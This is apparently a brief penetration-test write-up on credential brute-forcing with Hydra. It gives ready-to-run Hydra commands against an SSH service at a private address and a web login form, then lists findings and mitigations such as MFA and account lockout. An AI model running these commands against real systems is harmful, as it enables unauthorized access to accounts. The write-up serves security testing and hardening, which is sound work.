# Brute Force Attack with Hydra

## Overview
Brute-force attacks were conducted against **SSH and web login portals** to gain unauthorized access by attempting multiple username-password combinations.

## Commands Used
```bash
# Brute-force SSH credentials
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# Brute-force web login page
hydra -l admin -P rockyou.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:Incorrect password"
```
## Findings
1. Weak passwords were used for SSH and web application admin accounts.
2. The login portal had no account lockout mechanism, allowing unlimited login attempts.

## Mitigation Strategies
1. Enforce strong password policies with complexity requirements.
2. Implement multi-factor authentication (MFA) for all admin accounts.
3. Apply account lockout policies to block repeated failed login attempts.
4. Restrict SSH access to trusted IP addresses using firewall rules.